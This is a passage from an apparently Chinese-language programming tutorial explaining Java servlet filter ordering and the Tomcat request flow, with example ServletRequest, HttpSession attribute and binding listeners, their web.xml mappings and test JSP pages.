class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">Filter</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        Filter.<span class="keyword">super</span>.init(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String userIP = (String) servletRequest.getAttribute(<span class="string">&quot;IP&quot;</span>);</span><br><span class="line">        String userAgent = (String) servletRequest.getAttribute(<span class="string">&quot;UA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        servletResponse.getWriter().write(String.join(<span class="string">&quot;&lt;br&gt;&quot;</span>,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;- Filter B -&quot;</span>,userIP, userAgent,<span class="string">&quot;- END -&quot;</span>&#125;));</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有关 <code>ABFilter.jsp</code> 页面内容👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ABFilter&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%=<span class="string">&quot;&lt;br&gt; - ABFilter Page -&quot;</span>%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>以及 <code>web.xml</code> 内容👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>custom.AFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>BFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>custom.BFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>BFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241229092.png" alt="image-20220224122928987"></p>
<p>此时得到响应显示顺序为 <code>过滤器A</code> =&gt; <code>过滤器B</code> =&gt; <code>页面</code> 。</p>
<h4 id="filter和tomcat过程">- filter和tomcat过程 -</h4>
<p>① <code>tomcat</code> 服务器在启动时先实例化所有 <code>过滤器</code> ，并调用其 <code>init</code> 方法</p>
<p>② <code>客户端</code> 向 <code>tomcat</code> 服务器上的 <code>jsp</code> 发送 <code>http</code> 请求</p>
<p>③ <code>tomcat</code> 容器将从 <code>客户端</code> 发来的 <code>http</code> 请求封装成 <code>ServletRequest</code> 对象</p>
<p>④  <code>tomcat</code> 容器实例化一个 <code>ServletResponse</code> 对象用作响应</p>
<p>⑤ <code>tomcat</code> 服务器根据 <code>&lt;filter-mapping&gt;</code> 定义的 <code>过滤器</code> 顺序将 <code>ServletRequest</code> 和 <code>ServletResponse</code> 对象作为参数调用排在首位的实例化后 <code>过滤器</code> 的 <code>doFilter</code> 方法</p>
<p>⑥ 排在首位 <code>过滤器</code> 的 <code>doFilter</code> 方法中通过 <code>doFilter</code> 方法的调用将 <code>ServletRequest</code> 和 <code>ServletResponse</code> 对象传递给下一个 <code>过滤器</code> ，最后一个 <code>过滤器</code></p>
<p>⑦  <code>tomcat</code> 服务器由 <code>过滤器</code> 处理得到的 <code>ServletRequest</code> 和 <code>ServletResponse</code> 对象传给 <code>servlet</code> 的对应方法，后面就是一般的处理流程了</p>
<h3 id="监听器-listener">- 监听器(listener) -</h3>
<p>监听器即是 <code>servlet</code> 规范中定义的一种特殊的类，用以监听特定的事件(类似 <code>WorldEditor</code> 中 <code>Trigger</code> 的 <code>Event</code>)，如创建、销毁、增加、删除、绑定等。</p>
<h4 id="监听器划分">- 监听器划分 -</h4>
<p>按照监听对象划分可以分为👇</p>
<ul>
<li><code>SerletContext</code> =&gt; <code>SerletContextLisener</code></li>
<li><code>HttpSession</code> =&gt; <code>HttpSessionListener</code></li>
<li><code>ServletRequest</code> =&gt; <code>ServletRequestListener</code></li>
</ul>
<p>按照监听事件可以划分为👇</p>
<ol>
<li>
<p>监听域对象自身的创建和销毁的事件监听器</p>
<ul>
<li>
<p><code>SerletContextListener</code></p>
<ul>
<li>
<p><code>contextInitialized()</code></p>
</li>
<li>
<p><code>contextDestroyed()</code></p>
</li>
</ul>
</li>
<li>
<p><code>HttpSessionListener</code></p>
<ul>
<li><code>sessionCreated()</code></li>
<li><code>sessionDestroyed()</code></li>
</ul>
</li>
<li>
<p><code>ServletRequestListener</code></p>
<ul>
<li><code>requestInitialized()</code></li>
<li><code>requestDestroyed()</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>监听域对象中属性变动的事件监听器</p>
<ul>
<li>
<p><code>ServletContextAttributeListener</code></p>
<ul>
<li>
<p><code>AttributeAdded()</code></p>
</li>
<li>
<p><code>AttributeRemoved()</code></p>
</li>
<li>
<p><code>AttributeReplaced()</code></p>
</li>
</ul>
</li>
<li>
<p><code>HttpSessionAttributeListener</code></p>
<ul>
<li>
<p><code>AttributeAdded()</code></p>
</li>
<li>
<p><code>AttributeRemoved()</code></p>
</li>
<li>
<p><code>AttributeReplaced()</code></p>
</li>
</ul>
</li>
<li>
<p><code>ServletRequestAttributeListener</code></p>
<ul>
<li>
<p><code>AttributeAdded()</code></p>
</li>
<li>
<p><code>AttributeRemoved()</code></p>
</li>
<li>
<p><code>AttributeReplaced()</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>监听绑定到 <code>HttpSession</code> 域中某个对象状态的事件监听器</p>
<ul>
<li>
<p><code>HttpSessionBindingListener</code></p>
<ul>
<li><code>valueBound()</code></li>
<li><code>valueUnBound()</code></li>
</ul>
</li>
<li>
<p><code>HttpSessionActivationListener</code></p>
<ul>
<li><code>sessionWillPassivate()</code></li>
<li><code>sessionDidActivate()</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<p>用一张图来表示(摘自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37651267/article/details/90962152">JSP的Web监听器</a>)👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241312415.jpeg" alt="img"></p>
<p>可见监听器和过滤器一样，是有顺序的，且启动顺序大于过滤器和 <code>servlet</code> 。</p>
<h4 id="自定义监听器">- 自定义监听器 -</h4>
<p>那么不妨从按照监听事件划分的方法依次写一个例子。</p>
<h5 id="域对象自身的创建和销毁的事件">- 域对象自身的创建和销毁的事件 -</h5>
<p>这里以 <code>ServletRequest</code> 对象为例，实现在请求时显示传入的 <code>user-agent</code> 请求标头内容，在销毁时显示所传入的所有参数内容。</p>
<p>先是监听器代码👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">requestListener</span> <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">ServletRequestListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        ServletRequestListener.<span class="keyword">super</span>.requestInitialized(sre);</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt; INIT &gt;&quot;</span>);</span><br><span class="line">        System.out.println(((HttpServletRequest) sre.getServletRequest()).getHeader(<span class="string">&quot;user-agent&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt; ==== &gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        ServletRequestListener.<span class="keyword">super</span>.requestDestroyed(sre);</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt; DESTROY &gt;&quot;</span>);</span><br><span class="line">        Map&lt;String,String[]&gt; map = sre.getServletRequest().getParameterMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;String,String[]&gt; entry: map.entrySet())&#123;</span><br><span class="line">            String key =  entry.getKey();</span><br><span class="line">            String[] values = entry.getValue();</span><br><span class="line">            System.out.println(key + <span class="string">&quot;:\n&quot;</span> + String.join(<span class="string">&quot;|&quot;</span>,values));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt; ==== &gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将其打包成 <code>jar</code> 后放到指定目录，然后是 <code>web.xml</code> 内容👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>custom.requestListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当然，如果 <code>servlet3.0+</code> 直接使用注解也可以👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br></pre></td></tr></table></figure>
<p>访问任意页面并传入参数，比如 <code>listener.jsp?a=1&amp;b=123&amp;b=321</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241352263.png" alt="image-20220224135224122"></p>
<p>如果再访问 <code>listener.jsp?c=10</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241353738.png" alt="image-20220224135328589"></p>
<p>可见每次请求都会存在 <code>ServletRequest</code> 对象的创建和销毁，因而也就会被监听到。</p>
<h5 id="域对象中属性变动的事件">- 域对象中属性变动的事件 -</h5>
<p>再写一个有关 <code>HttpSession</code> 增删改的监听器，实现在增操作时显示增的值，在进行改和删操作时判断所改删的值是否为特定值，若不为特定值则输出操作记录。</p>
<p>先是监听器代码👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionAttributeListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionBindingEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">sessionListener</span> <span class="keyword">implements</span> <span class="title">HttpSessionAttributeListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attributeAdded</span><span class="params">(HttpSessionBindingEvent se)</span> </span>&#123;</span><br><span class="line">        HttpSessionAttributeListener.<span class="keyword">super</span>.attributeAdded(se);</span><br><span class="line">        System.out.println(<span class="string">&quot;ADD -&gt; &quot;</span> + se.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;VALUE -&gt; &quot;</span> + se.getValue());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attributeReplaced</span><span class="params">(HttpSessionBindingEvent se)</span> </span>&#123;</span><br><span class="line">        HttpSessionAttributeListener.<span class="keyword">super</span>.attributeReplaced(se);</span><br><span class="line">        <span class="keyword">if</span>(se.getName().equals(<span class="string">&quot;cant&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;REPLACE -&gt; cant &quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;VALUE -&gt; &quot;</span> + se.getSession().getAttribute(se.getName()) + <span class="string">&quot; -&gt; &quot;</span> + se.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">attributeRemoved</span><span class="params">(HttpSessionBindingEvent se)</span> </span>&#123;</span><br><span class="line">        HttpSessionAttributeListener.<span class="keyword">super</span>.attributeRemoved(se);</span><br><span class="line">        <span class="keyword">if</span>(se.getName().equals(<span class="string">&quot;cant&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;REMOVE -&gt; cant &quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;VALUE -&gt; &quot;</span> + se.getSession().getAttribute(se.getName()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>打包成 <code>jar</code> 放到对应的目录，接着是 <code>web.xml</code> 内容👇</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>custom.sessionListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试的 <code>listener2.jsp</code> 文件内容👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;LISTENER2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    session.setAttribute(<span class="string">&quot;can&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;cant&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.setAttribute(<span class="string">&quot;can&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;cant&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.removeAttribute(<span class="string">&quot;can&quot;</span>);</span><br><span class="line">    session.removeAttribute(<span class="string">&quot;cant&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241416963.png" alt="image-20220224141632790"></p>
<p>可见只要 <code>cant</code> 被更改就会有操作记录被输出，而对 <code>remove</code> 操作监听的方法是在删除操作完成后才会被执行的。</p>
<h5 id="绑定到-HttpSession-域中某个对象状态的事件">- 绑定到 <code>HttpSession</code> 域中某个对象状态的事件 -</h5>
<p>在 <code>HttpSession</code> 中对象的状态有两种👇</p>
<ul>
<li>绑定与解除绑定</li>
<li>钝化与活化</li>
</ul>
<p>其中 <code>绑定</code> 与 <code>解除绑定</code> 是指在 <code>HttpSession</code> 中某个对象设置为属性值或移除某个属性的值，而 <code>钝化</code> 指的是服务器将不常用的 <code>session</code> 对象暂时序列化放到系统文件或数据库中，与 <code>钝化</code> 相反，<code>活化</code> 是将暂存在系统文件或数据库中的 <code>session</code> 对象反序列化到服务器中。当 <code>tomcat</code> 服务器被关闭、重启时或是重新加载时，都会将 <code>session</code> 对象钝化到服务器的文件系统中。</p>
<p>针对 <code>绑定</code> 与 <code>解除绑定</code> 的监听器，得继承 <code>HttpSessionBindingListener</code> 类，而针对 <code>钝化</code> 与 <code>活化</code> 的监听器则需要继承 <code>HttpSessionActivationListener</code> 类。</p>
<p>这种 <code>绑定对象</code> 的监听器和上面与 <code>设置属性</code> 的监听器的区别在于 <code>绑定对象</code> 的监听器只监听某种类型对象的绑定与解除绑定操作，而 <code>设置属性</code> 的监听器所监听的是所有设置属性的操作。</p>
<p>比方说先写一个 <code>绑定</code> 与 <code>解除绑定</code> 的监听器，为实现在对 <code>X</code> 类类型的值进行 <code>绑定</code> 和 <code>解除绑定</code> 时输出特定属性，监听器代码👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionBindingEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionBindingListener;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">X</span> <span class="keyword">implements</span> <span class="title">HttpSessionBindingListener</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String a;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String b;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">X</span><span class="params">(String start, String end)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = start;</span><br><span class="line">        <span class="keyword">this</span>.b = end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">valueBound</span><span class="params">(HttpSessionBindingEvent event)</span> </span>&#123;</span><br><span class="line">        HttpSessionBindingListener.<span class="keyword">super</span>.valueBound(event);</span><br><span class="line">        System.out.println(<span class="string">&quot;a -&gt; &quot;</span> + <span class="keyword">this</span>.a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">valueUnbound</span><span class="params">(HttpSessionBindingEvent event)</span> </span>&#123;</span><br><span class="line">        HttpSessionBindingListener.<span class="keyword">super</span>.valueUnbound(event);</span><br><span class="line">        System.out.println(<span class="string">&quot;b -&gt; &quot;</span> + <span class="keyword">this</span>.b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将其打包成 <code>jar</code> 后放在相应目录即可，不需要改 <code>web.xml</code> 的内容。</p>
<p>然后是 <code>x.jsp</code> 文件内容👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;custom.X&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;X&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    X x = <span class="keyword">new</span> X(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;end&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.setAttribute(<span class="string">&quot;x&quot;</span>,x);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.removeAttribute(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">    session.removeAttribute(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241450737.png" alt="image-20220224145045586"></p>
<p>可见只有 <code>X</code> 类类型的变量当被装入 <code>session</code> 或从 <code>session</code> 中删除时才会触发 <code>绑定</code> 与 <code>解除绑定</code> 的监听器，如果再利用上面有关 <code>HttpSession</code> 增删改的监听器，将 <code>x,jsp</code> 内容改为以下值👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;custom.X&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;X&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    X x = <span class="keyword">new</span> X(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;end&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.setAttribute(<span class="string">&quot;cant&quot;</span>,x);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">    session.setAttribute(<span class="string">&quot;cant&quot;</span>,x);</span><br><span class="line"></span><br><span class="line">    session.removeAttribute(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">    session.removeAttribute(<span class="string">&quot;cant&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241456425.png" alt="image-20220224145615268"></p>
<p>可见有关 <code>绑定</code> 和 <code>解除绑定</code> 的监听器是在上面有关 <code>HttpSession</code> 增删改的监听器前的，也就是说当指定类型的类实例被放入 <code>session</code> 中这个操作被执行前 <code>绑定</code> 和 <code>解除绑定</code> 的监听器就已经监听到了，而在指定类型的类实例在被 <code>session</code> 执行删除操作前 <code>绑定</code> 和 <code>解除绑定</code> 的监听器也能监听到。</p>
<p>第二个是 <code>钝化</code> 与 <code>活化</code> 监听器，实现在服务器对 <code>Y</code> 类类型的值进行 <code>钝化</code> 和 <code>活化</code> 时输出特定的属性值，先是监听器代码👇</p>
